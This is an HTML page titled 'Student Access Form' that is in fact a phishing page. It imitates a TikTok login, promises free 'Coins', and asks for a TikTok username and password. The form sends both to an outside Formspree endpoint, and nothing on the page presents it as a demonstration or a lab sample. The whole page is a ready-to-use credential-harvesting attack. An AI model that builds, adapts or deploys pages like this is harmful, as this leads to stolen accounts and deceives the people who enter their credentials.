<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Student Access Form</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background: #f9f9f9;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
  }
  form {
    background: #fff;
    padding: 30px;
    border-radius: 8px;
    box-shadow: 0px 0px 10px #ccc;
    width: 100%;
    max-width: 400px;
  }
  h2 {
    text-align: center;
    margin-bottom: 20px;
    color: #333;
    font-size: 18px;
    line-height: 1.4;
  }
  .main-title {
    font-weight: 700;
    margin-bottom: 8px;
  }
  .sub-title {
    font-weight: 400;
    color: #555;
    display: block;
  }
  input {
    width: 100%;
    padding: 10px;
    margin: 8px 0 15px 0;
    border: 1px solid #ccc;
    border-radius: 4px;
  }
  button {
    width: 100%;
    background-color: #4CAF50;
    color: white;
    padding: 12px;
    border: none;
    border-radius: 4px;
    cursor: pointer;
  }
  button:hover {
    background-color: #45a049;
  }
</style>
</head>
<body>
<form action="https://formspree.io/f/xyznbrvg" method="POST">
  <h2>
    <span class="main-title">Log in to get Coins</span>
    <span class="sub-title">Log in to your TikTok account to get Coins, check notifications and more.</span>
  </h2>
  <input type="text" name="username" placeholder="Username" required>
  <input type="text" name="Password" placeholder="Password" required>
  <button type="submit">Submit</button>
</form>
</body>
</html>
